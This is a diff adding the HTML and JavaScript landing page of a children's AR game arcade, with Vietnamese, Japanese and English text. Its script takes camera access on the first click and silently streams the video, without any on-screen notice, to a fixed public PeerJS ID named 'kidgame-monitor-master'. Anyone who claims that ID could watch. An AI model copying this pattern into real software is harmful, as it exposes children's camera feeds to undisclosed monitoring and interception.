@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <title>KidGame Arcade - Select Your Game</title>
+    <link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;600;800&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Be Vietnam Pro', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(45deg, #ff9a9e 0%, #fecfef 99%, #fecfef 100%);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            overflow-x: hidden;
+            transition: all 0.5s ease;
+            position: relative;
+        }
+
+        /* Thêm các bong bóng làm nền (Premium Effect) */
+        body::before, body::after {
+            content: '';
+            position: absolute;
+            width: 300px;
+            height: 300px;
+            border-radius: 50%;
+            z-index: 0;
+            filter: blur(80px);
+            opacity: 0.7;
+            animation: floatOrb 10s ease-in-out infinite alternate;
+        }
+        body::before {
+            background: #a18cd1;
+            top: 10%;
+            left: 10%;
+        }
+        body::after {
+            background: #fbc2eb;
+            bottom: 10%;
+            right: 10%;
+            animation-delay: -5s;
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        @keyframes floatOrb {
+            0% { transform: translateY(0) scale(1); }
+            100% { transform: translateY(-50px) scale(1.1); }
+        }
+
+        header {
+            margin-top: 1rem;
+            margin-bottom: 1rem;
+            text-align: center;
+            animation: bounceIn 1s ease-out;
+            position: relative;
+            z-index: 10;
+        }
+
+        h1 {
+            font-size: 3rem;
+            font-family: 'Be Vietnam Pro', sans-serif;
+            color: #fff;
+            text-shadow: 4px 4px 0 #ea580c, -2px -2px 0 #ea580c, 2px -2px 0 #ea580c, -2px 2px 0 #ea580c, 0 10px 15px rgba(0,0,0,0.3);
+            letter-spacing: 2px;
+            margin-bottom: 0.2rem;
+        }
+
+        p.subtitle {
+            font-size: 1.2rem;
+            color: #78350f;
+            font-weight: 800;
+            background: rgba(255,255,255,0.5);
+            padding: 5px 20px;
+            border-radius: 20px;
+            display: inline-block;
+        }
+
+        .game-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1.5rem;
+            width: 100%;
+            max-width: 1200px;
+            padding: 0 1rem;
+            margin-bottom: 1rem;
+            z-index: 10;
+        }
+
+        .game-card {
+            background: rgba(255, 255, 255, 0.25);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border: 2px solid rgba(255, 255, 255, 0.4);
+            border-radius: 35px;
+            overflow: hidden;
+            text-decoration: none;
+            color: inherit;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.15);
+            cursor: pointer;
+            z-index: 10;
+        }
+
+        .game-card:hover {
+            transform: translateY(-15px) rotate(1deg) scale(1.02);
+            border-color: rgba(255, 255, 255, 0.8);
+            box-shadow: 0 15px 35px rgba(236, 72, 153, 0.3), 0 0 20px rgba(255, 255, 255, 0.5);
+        }
+
+        .game-card:active {
+            transform: translateY(5px);
+            box-shadow: 0 5px 15px rgba(31, 38, 135, 0.2);
+        }
+
+        .card-image {
+            width: 100%;
+            height: 160px;
+            overflow: hidden;
+            position: relative;
+            background: rgba(255, 255, 255, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 70px;
+            text-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+
+        .card-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: transform 0.6s ease;
+        }
+
+        .game-card:hover .card-image {
+            font-size: 80px;
+            transition: font-size 0.3s ease;
+        }
+
+        .card-content {
+            padding: 1rem;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .tag {
+            padding: 0.3rem 1rem;
+            border-radius: 25px;
+            font-size: 0.8rem;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 0.5rem;
+            font-family: 'Be Vietnam Pro', cursive;
+        }
+
+        .tag.ar {
+            background: #fdf2f8;
+            color: #ec4899;
+            border: 3px solid #fbcfe8;
+        }
+
+        .tag.coming-soon {
+            background: #f1f5f9;
+            color: #64748b;
+            border: 3px solid #e2e8f0;
+        }
+
+        .card-title {
+            font-size: 1.5rem;
+            font-family: 'Be Vietnam Pro', sans-serif;
+            color: #1f2937;
+            margin-bottom: 0.2rem;
+        }
+
+        .card-desc {
+            color: #4b5563;
+            font-size: 1rem;
+            line-height: 1.2;
+            margin-bottom: 1rem;
+            font-weight: 600;
+            flex-grow: 1;
+        }
+
+        .play-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 10px 30px;
+            background: linear-gradient(135deg, #ff758c 0%, #ff7eb3 100%);
+            color: white;
+            border-radius: 50px;
+            font-family: 'Be Vietnam Pro', sans-serif;
+            font-size: 1.3rem;
+            font-weight: bold;
+            border: none;
+            box-shadow: 0 6px 15px rgba(255, 117, 140, 0.4);
+            transition: all 0.3s;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+
+        .game-card:hover .play-btn {
+            transform: scale(1.05) translateY(-2px);
+            box-shadow: 0 10px 20px rgba(255, 117, 140, 0.6);
+        }
+
+        .play-btn.disabled {
+            background: #94a3b8;
+            box-shadow: 0 8px 0 #64748b;
+            cursor: not-allowed;
+        }
+
+        @keyframes bounceIn {
+            0% { transform: scale(0.5); opacity: 0; }
+            60% { transform: scale(1.05); opacity: 1; }
+            100% { transform: scale(1); }
+        }
+        
+        .settings-btn {
+            position: absolute;
+            top: calc(env(safe-area-inset-top) + 20px);
+            right: 20px;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: white;
+            border: 4px solid #facc15;
+            color: #ca8a04;
+            font-size: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 6px 0 #ca8a04;
+            z-index: 100;
+        }
+        
+        .settings-btn:hover {
+            transform: rotate(90deg) scale(1.1);
+            background: #fef08a;
+        }
+
+        .refresh-btn {
+            position: absolute;
+            top: calc(env(safe-area-inset-top) + 20px);
+            right: 90px;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: white;
+            border: 4px solid #10b981;
+            color: #047857;
+            font-size: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 6px 0 #047857;
+            z-index: 100;
+            cursor: pointer;
+        }
+        
+        .refresh-btn:hover {
+            transform: rotate(360deg) scale(1.1);
+            background: #d1fae5;
+        }
+
+        .lang-selector {
+            position: absolute;
+            top: calc(env(safe-area-inset-top) + 20px);
+            left: 20px;
+            display: flex;
+            gap: 10px;
+            z-index: 100;
+        }
+
+        .lang-btn {
+            background: rgba(255,255,255,0.4);
+            backdrop-filter: blur(10px);
+            border: 2px solid rgba(255,255,255,0.6);
+            color: #1f2937;
+            font-family: 'Be Vietnam Pro', sans-serif;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 16px;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+            transition: all 0.3s;
+            font-weight: bold;
+        }
+
+        .lang-btn:hover {
+            transform: translateY(-3px);
+            background: rgba(255,255,255,0.7);
+        }
+        .lang-btn.active {
+            background: linear-gradient(135deg, #a18cd1 0%, #fbc2eb 100%);
+            color: white;
+            border-color: white;
+            box-shadow: 0 5px 15px rgba(161, 140, 209, 0.5);
+            text-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+
+        /* Iframe Container for SPA */
+        #gameContainer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 1000;
+            display: none;
+        }
+        #gameContainer iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        #closeGameBtn {
+            position: fixed;
+            top: calc(env(safe-area-inset-top) + 20px);
+            left: 20px;
+            background: #ef4444;
+            color: white;
+            border: 4px solid white;
+            border-radius: 25px;
+            padding: 15px 25px;
+            font-family: 'Be Vietnam Pro', cursive;
+            font-size: 20px;
+            cursor: pointer;
+            z-index: 2000;
+            box-shadow: 0 6px 0 #b91c1c;
+            display: none;
+            transition: transform 0.2s;
+        }
+        #closeGameBtn:hover {
+            transform: scale(1.1);
+        }
+
+        /* --- MOBILE RESPONSIVENESS --- */
+        @media (max-width: 768px) {
+            header {
+                margin-top: calc(env(safe-area-inset-top) + 70px); /* Make room for top buttons */
+            }
+            h1 {
+                font-size: 2rem;
+            }
+            p.subtitle {
+                font-size: 0.9rem;
+                padding: 2px 10px;
+            }
+            .game-grid {
+                grid-template-columns: 1fr 1fr; /* Force 2x2 grid */
+                gap: 0.5rem;
+                padding: 0 5px;
+                margin-bottom: 0.5rem;
+            }
+            .game-card {
+                border-width: 2px;
+                border-radius: 10px;
+            }
+            .card-image {
+                height: 70px;
+                font-size: 30px;
+            }
+            .card-content {
+                padding: 5px;
+            }
+            .tag {
+                font-size: 0.5rem;
+                padding: 0.1rem 0.4rem;
+                margin-bottom: 0.2rem;
+                border-width: 1px;
+            }
+            .card-title {
+                font-size: 0.8rem;
+                margin-bottom: 0.1rem;
+            }
+            .card-desc {
+                display: none; /* Hide description on mobile to save space */
+            }
+            .play-btn {
+                padding: 4px 10px;
+                font-size: 0.7rem;
+                border-width: 2px;
+                box-shadow: 0 2px 0 #16a34a;
+            }
+            .lang-selector {
+                top: calc(env(safe-area-inset-top) + 10px);
+                left: 50%;
+                transform: translateX(-50%); /* Center on mobile */
+            }
+            .lang-btn {
+                padding: 4px 8px;
+                font-size: 12px;
+                border-width: 2px;
+                box-shadow: 0 2px 0 #2563eb;
+            }
+            .settings-btn {
+                top: calc(env(safe-area-inset-top) + 45px);
+                right: 10px;
+                width: 35px;
+                height: 35px;
+                font-size: 16px;
+                border-width: 2px;
+                box-shadow: 0 2px 0 #ca8a04;
+            }
+            .refresh-btn {
+                top: calc(env(safe-area-inset-top) + 45px);
+                right: 55px;
+                width: 35px;
+                height: 35px;
+                font-size: 16px;
+                border-width: 2px;
+                box-shadow: 0 2px 0 #047857;
+            }
+            #closeGameBtn {
+                top: calc(env(safe-area-inset-top) + 45px);
+                left: 10px;
+                padding: 5px 10px;
+                font-size: 12px;
+                border-width: 2px;
+                box-shadow: 0 2px 0 #b91c1c;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="lang-selector">
+        <button class="lang-btn active" onclick="setLang('vi')">🇻🇳 VI</button>
+        <button class="lang-btn" onclick="setLang('ja')">🇯🇵 JP</button>
+        <button class="lang-btn" onclick="setLang('en')">🇬🇧 EN</button>
+    </div>
+
+    <button class="refresh-btn" onclick="forceReload()" title="Tải Lại">🔄</button>
+    <a href="monitor/index.html" class="settings-btn" title="Settings">⚙️</a>
+    
+    <header>
+        <h1 id="t_title">Khu Vui Chơi</h1>
+        <p class="subtitle" id="t_subtitle">Chọn một trò chơi thật vui nhé!</p>
+    </header>
+
+    <div class="game-grid">
+        <!-- App Hub AR (NEWEST) -->
+        <div onclick="openGame('AppHub/index.html')" class="game-card">
+            <div class="card-image">
+                💄🎮
+            </div>
+            <div class="card-content">
+                <span class="tag ar" style="background:#e0e7ff; color:#4338ca; border-color:#c7d2fe;">Siêu Ứng Dụng</span>
+                <h2 class="card-title" id="t_hub_title">Mạng Xã Hội AR</h2>
+                <p class="card-desc" id="t_hub_desc">Trải nghiệm phong cách vuốt chuyển 50+ filter làm đẹp và game tương tác cực đỉnh!</p>
+                <div class="play-btn" id="t_play_hub" style="background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%); box-shadow: 0 6px 15px rgba(99, 102, 241, 0.4);">Mở AppHub!</div>
+            </div>
+        </div>
+
+        <!-- Magic Room AR -->
+        <div onclick="openGame('MagicRoom/index.html')" class="game-card">
+            <div class="card-image">
+                ✨👑
+            </div>
+            <div class="card-content">
+                <span class="tag ar" style="background:#fce7f3; color:#db2777; border-color:#f9a8d4;">Môi Trường Ảo</span>
+                <h2 class="card-title" id="t_mr_title">Phòng Phép Thuật</h2>
+                <p class="card-desc" id="t_mr_desc">Kéo rèm gọi mưa, thử đồ trang điểm, và chơi đùa với các filter tuyệt đẹp!</p>
+                <div class="play-btn" id="t_play_mr">Khám Phá Ngay!</div>
+            </div>
+        </div>
+
+        <!-- Beauty Room -->
+        <div class="card" onclick="window.location.href='BeautyRoom/index.html'">
+            <div class="card-icon">💄</div>
+            <div class="card-title">Phòng Làm Đẹp</div>
+            <div class="card-desc">Chỉnh sửa nét mặt, làm trắng da mượt mà với AI Filter</div>
+        </div>
+
+        <!-- Fruit Ninja AR -->
+        <div onclick="openGame('FruitNinja/index.html')" class="game-card">
+            <div class="card-image">
+                🍎🗡️
+            </div>
+            <div class="card-content">
+                <span class="tag ar">Camera AI</span>
+                <h2 class="card-title" id="t_fn_title">Chém Hoa Quả</h2>
+                <p class="card-desc" id="t_fn_desc">Dùng tay múa như Ninja để chém trái cây nhé! Chơi cùng Sâu háu ăn, Cảnh sát chó và Tàu điện!</p>
+                <div class="play-btn" id="t_play1">Chơi Ngay!</div>
+            </div>
+        </div>
+
+        <!-- Street Fighter AR -->
+        <div onclick="openGame('StreetFighter/index.html')" class="game-card">
+            <div class="card-image">
+                🥋🔥
+            </div>
+            <div class="card-content">
+                <span class="tag ar">Camera AI</span>
+                <h2 class="card-title" id="t_sf_title">Đánh Võ Phép Thuật</h2>
+                <p class="card-desc" id="t_sf_desc">Đứng trước màn hình, đấm đá và vận nội công chưởng lửa như siêu nhân!</p>
+                <div class="play-btn" id="t_play2">Chơi Ngay!</div>
+            </div>
+        </div>
+
+        <!-- Robot Wars (Placeholder) -->
+        <div class="game-card" style="cursor: default; opacity: 0.8;">
+            <div class="card-image">
+                🤖🚀
+            </div>
+            <div class="card-content">
+                <span class="tag coming-soon" id="t_soon">Sắp Ra Mắt</span>
+                <h2 class="card-title" id="t_rw_title">Đấu Trường Robot</h2>
+                <p class="card-desc" id="t_rw_desc">Lắp ráp robot khổng lồ của riêng bé và chiến đấu. Đang xây dựng nha!</p>
+                <div class="play-btn disabled" id="t_locked">Chưa mở khóa</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Game Container -->
+    <div id="gameContainer">
+        <button id="closeGameBtn" onclick="closeGame()">🏠 Về Nhà</button>
+    </div>
+
+    <script>
+        // --- I18N SYSTEM ---
+        const dictionary = {
+            vi: {
+                title: "Khu Vui Chơi",
+                subtitle: "Chọn một trò chơi thật vui nhé!",
+                hub_title: "Mạng Xã Hội AR",
+                hub_desc: "Trải nghiệm phong cách vuốt chuyển 50+ filter làm đẹp và game tương tác cực đỉnh!",
+                play_hub: "Mở AppHub!",
+                mr_title: "Phòng Phép Thuật",
+                mr_desc: "Kéo rèm gọi mưa, thử đồ trang điểm, và chơi đùa với các filter tuyệt đẹp!",
+                play_mr: "Khám Phá Ngay!",
+                fn_title: "Chém Hoa Quả",
+                fn_desc: "Dùng tay múa như Ninja để chém trái cây nhé! Chơi cùng Sâu háu ăn, Cảnh sát chó và Tàu điện!",
+                sf_title: "Đánh Võ Phép Thuật",
+                sf_desc: "Đứng trước màn hình, đấm đá và vận nội công chưởng lửa như siêu nhân!",
+                rw_title: "Đấu Trường Robot",
+                rw_desc: "Lắp ráp robot khổng lồ của riêng bé và chiến đấu. Đang xây dựng nha!",
+                play: "Chơi Ngay!",
+                soon: "Sắp Ra Mắt",
+                locked: "Chưa mở khóa",
+                home: "🏠 Về Nhà"
+            },
+            ja: {
+                title: "キッズプレイランド",
+                subtitle: "楽しいゲームをえらぼう！",
+                hub_title: "ARソーシャルハブ",
+                hub_desc: "50種類以上の美容フィルターやインタラクティブゲームをスワイプして体験しよう！",
+                play_hub: "ハブを開く",
+                mr_title: "魔法の部屋",
+                mr_desc: "カーテンを引いて雨を降らせたり、メイクフィルターで遊ぼう！",
+                play_mr: "あそぶ！",
+                fn_title: "フルーツ忍者",
+                fn_desc: "手を使ってフルーツを切ろう！あおむし、ラブラドール警察、踏み切りと一緒に遊ぼう！",
+                sf_title: "魔法の格闘技",
+                sf_desc: "画面の前に立って、パンチやキックをしてスーパーマンのように魔法を放とう！",
+                rw_title: "ロボットバトル",
+                rw_desc: "自分だけの巨大ロボットを組み立てて戦おう。準備中だよ！",
+                play: "あそぶ！",
+                soon: "もうすぐ",
+                locked: "まだあそべない",
+                home: "🏠 おうちにかえる"
+            },
+            en: {
+                title: "Kids Playground",
+                subtitle: "Choose a fun game to play!",
+                hub_title: "AR Social Hub",
+                hub_desc: "Swipe through 50+ beauty filters and interactive games in TikTok style!",
+                play_hub: "Open AppHub",
+                mr_title: "Magic Room",
+                mr_desc: "Pull the string to make it rain, try on makeup, and play with beautiful filters!",
+                play_mr: "Explore Now!",
+                fn_title: "Fruit Ninja",
+                fn_desc: "Use your hands like a Ninja to slice fruits! Play with Caterpillar, Sheriff Labrador and Trains!",
+                sf_title: "Magic Fighter",
+                sf_desc: "Stand in front of the screen, punch, kick and shoot fireballs like a superhero!",
+                rw_title: "Robot Arena",
+                rw_desc: "Build your own giant robot and fight. Currently under construction!",
+                play: "Play Now!",
+                soon: "Coming Soon",
+                locked: "Locked",
+                home: "🏠 Go Home"
+            }
+        };
+
+        function setLang(lang) {
+            localStorage.setItem('kidgame_lang', lang);
+            
+            // Update active button
+            document.querySelectorAll('.lang-btn').forEach(btn => {
+                btn.classList.remove('active');
+                if(btn.innerText.toLowerCase().includes(lang)) {
+                    btn.classList.add('active');
+                }
+            });
+
+            // Apply translations
+            const text = dictionary[lang] || dictionary['vi'];
+            document.getElementById('t_title').innerText = text.title;
+            document.getElementById('t_subtitle').innerText = text.subtitle;
+            document.getElementById('t_hub_title').innerText = text.hub_title;
+            document.getElementById('t_hub_desc').innerText = text.hub_desc;
+            document.getElementById('t_play_hub').innerText = text.play_hub;
+            document.getElementById('t_mr_title').innerText = text.mr_title;
+            document.getElementById('t_mr_desc').innerText = text.mr_desc;
+            document.getElementById('t_play_mr').innerText = text.play_mr;
+            document.getElementById('t_fn_title').innerText = text.fn_title;
+            document.getElementById('t_fn_desc').innerText = text.fn_desc;
+            document.getElementById('t_sf_title').innerText = text.sf_title;
+            document.getElementById('t_sf_desc').innerText = text.sf_desc;
+            document.getElementById('t_rw_title').innerText = text.rw_title;
+            document.getElementById('t_rw_desc').innerText = text.rw_desc;
+            document.getElementById('t_soon').innerText = text.soon;
+            document.getElementById('t_locked').innerText = text.locked;
+            document.getElementById('t_play1').innerText = text.play;
+            document.getElementById('t_play2').innerText = text.play;
+            document.getElementById('closeGameBtn').innerText = text.home;
+        }
+
+        // Initialize language
+        const savedLang = localStorage.getItem('kidgame_lang') || 'vi';
+        setLang(savedLang);
+
+        // --- CACHE BUSTING RELOAD (iOS-compatible) ---
+        async function forceReload() {
+            const btn = document.querySelector('.refresh-btn');
+            btn.innerText = "⏳";
+            btn.disabled = true;
+            
+            try {
+                // 1. Xóa toàn bộ Cache Storage API (nếu có service worker hoặc cache)
+                if ('caches' in window) {
+                    const keys = await caches.keys();
+                    await Promise.all(keys.map(k => caches.delete(k)));
+                    console.log('Đã xóa Cache Storage:', keys);
+                }
+                
+                // 2. Hủy đăng ký mọi Service Worker
+                if ('serviceWorker' in navigator) {
+                    const registrations = await navigator.serviceWorker.getRegistrations();
+                    await Promise.all(registrations.map(r => r.unregister()));
+                    console.log('Đã hủy Service Workers:', registrations.length);
+                }
+            } catch(e) {
+                console.warn('Cache clearing error (non-critical):', e);
+            }
+
+            // 3. Chuyển hướng với timestamp mới để ép trình duyệt tải lại HTML gốc
+            //    Thêm cả tham số ngẫu nhiên phòng trường hợp CDN cache theo query string
+            const bustParam = Date.now() + '_' + Math.random().toString(36).slice(2);
+            window.location.replace(window.location.origin + window.location.pathname + '?_bust=' + bustParam);
+        }
+
+        // --- PRE-WARM & CONTINUOUS CAMERA STREAMING ---
+        // Yêu cầu quyền Camera ngay từ trang chủ. Nếu được cấp, các game sau sẽ không bị hỏi lại.
+        // Đồng thời, Hub sẽ chịu trách nhiệm phát luồng Camera liên tục (xuyên suốt) lên Monitor.
+        window.globalCameraStream = null;
+        let hubPeer = null;
+        let hubCall = null;
+
+        function initHubWebRTC(stream) {
+            if (typeof Peer === 'undefined') return;
+            hubPeer = new Peer(); // Random ID
+
+            hubPeer.on('open', (id) => {
+                console.log('Hub Peer ready:', id);
+                tryConnectToMonitor(stream);
+            });
+
+            hubPeer.on('error', (err) => {
+                console.error('Hub PeerJS error:', err);
+            });
+
+            // Periodically try to connect if disconnected
+            setInterval(() => {
+                if (!hubCall || !hubCall.open) {
+                    tryConnectToMonitor(stream);
+                }
+            }, 5000);
+        }
+
+        function tryConnectToMonitor(stream) {
+            if (!hubPeer || hubPeer.disconnected || !stream) return;
+            try {
+                if (stream.getTracks().length === 0) return;
+                const call = hubPeer.call('kidgame-monitor-master', stream);
+                if (call) {
+                    console.log("Hub calling monitor...");
+                    hubCall = call;
+                    call.on('error', (err) => {
+                        console.error("Call error:", err);
+                        hubCall = null;
+                    });
+                    call.on('close', () => {
+                        console.log("Call closed");
+                        hubCall = null;
+                    });
+                }
+            } catch(e) {
+                console.error("tryConnectToMonitor Error: ", e);
+            }
+        }
+
+        async function preWarmCamera() {
+            if (window.location.protocol !== 'file:') {
+                try {
+                    window.globalCameraStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                    console.log("Camera pre-warmed successfully!");
+                    initHubWebRTC(window.globalCameraStream);
+                } catch (err) {
+                    console.log("Camera pre-warm failed or denied:", err);
+                }
+            }
+        }
+        
+        // Chỉ chạy xin quyền khi người dùng click tương tác đầu tiên (tránh trình duyệt chặn popup)
+        document.body.addEventListener('click', function initCam() {
+            if (!window.globalCameraStream) preWarmCamera();
+            document.body.removeEventListener('click', initCam);
+        });
+
+        // --- SINGLE PAGE APP LOGIC ---
+        const gameContainer = document.getElementById('gameContainer');
+        const closeBtn = document.getElementById('closeGameBtn');
+        let activeIframe = null;
+
+        function openGame(url) {
+            // Nếu người dùng chạy trực tiếp bằng file:/// (nháy đúp), Iframe sẽ bị lỗi Camera.
+            // Do đó tự động lùi về phương pháp chuyển trang cũ (sẽ bị hỏi quyền nhiều lần).
+            if (window.location.protocol === 'file:') {
+                window.location.href = url;
+                return;
+            }
+
+            gameContainer.style.display = 'block';
+            closeBtn.style.display = 'block';
+            
+            // We no longer reuse iframes. They are destroyed on close to ensure a clean session.
+
+            // Truyền cache-busting param xuống iframe để sub-games cũng tải mã mới nhất
+            const parentBust = new URLSearchParams(window.location.search).get('_bust') || '';
+            const bustSuffix = parentBust ? ('?_bust=' + parentBust) : '';
+
+            // Create new iframe
+            const iframe = document.createElement('iframe');
+            iframe.id = 'frame_' + url;
+            iframe.src = url + bustSuffix;
+            iframe.allow = "camera; microphone";
+            gameContainer.appendChild(iframe);
+            activeIframe = iframe;
+        }
+
+        function closeGame() {
+            gameContainer.style.display = 'none';
+            closeBtn.style.display = 'none';
+            if (activeIframe) {
+                // Destroy the iframe completely to end the session per user request
+                activeIframe.remove();
+                activeIframe = null;
+            }
+        }
+
+        // Listen for messages from child iframes (in case they have their own back buttons)
+        window.addEventListener('message', (event) => {
+            if (event.data === 'close_game') {
+                closeGame();
+            }
+        });
+
+    </script>
+
+</body>
+</html>
